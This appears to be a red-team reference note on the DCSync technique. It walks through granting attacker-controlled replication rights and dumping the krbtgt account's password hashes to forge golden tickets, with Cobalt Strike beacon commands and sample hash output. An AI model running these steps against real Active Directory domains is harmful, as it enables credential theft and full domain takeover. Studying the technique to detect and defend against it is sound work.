# DCSync
DCSync is a technique which replicates the MS-DRSR protocol to replicate AD information, including password hashes. Under normal circumstances, this is only ever performed by (and between) Domain Controllers. There are specific DACLs relating to DCSync called **Replicating Directory Changes \[All/In Filtered Set\]**, which by default is only granted to Enterprise/Domain Admins and Domain Controllers.

These are set on the root domain object. Enterprise/Domain Admins can grant the Replicating Directory Change rights to other users, groups or computers.

1. Assign an additional attacker controlled user DCsync rights. [[PowerView#Assign rights DCSync]]
2. Perform a DCSync for the `EDU\krbtgt` which can create a golden ticket for everyone.
```beacon
beacon> getuid
[*] You are EDU\john

beacon> dcsync edu.evil.corp EDU\krbtgt
[DC] 'edu.evil.corp' will be the domain
[DC] 'dc-2.edu.evil.corp' will be the DC server
[DC] 'EDU\krbtgt' will be the user account

[...snip...]

* Primary:Kerberos-Newer-Keys *
 Default Salt : EDU.EVIL.IO/krbtgt
 Default Iterations : 4096
 Credentials
 aes256_hmac       (4096) : 390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa
 aes128_hmac       (4096) : 473a92cc46d09d3f9984157f7dbc7822
 des_cbc_md5       (4096) : b9fefed6da865732
```


## Tools
########
########


```meta
ttp: T1000
requirements:
results: 
description: 
```